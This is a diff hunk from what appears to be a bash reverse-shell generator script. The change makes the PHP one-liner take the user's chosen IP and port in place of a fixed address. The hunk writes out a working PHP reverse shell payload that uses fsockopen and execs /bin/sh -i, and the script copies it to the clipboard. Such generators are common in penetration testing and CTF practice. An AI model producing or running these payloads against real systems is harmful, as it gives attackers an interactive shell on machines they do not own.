@@ -71,7 +71,7 @@ function mainScript(){
 		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip
 
 	elif [ $language == "php" ]; then
-		shell="php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+		shell="php -r '$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip
 
 	elif [ $language == "ruby" ]; then
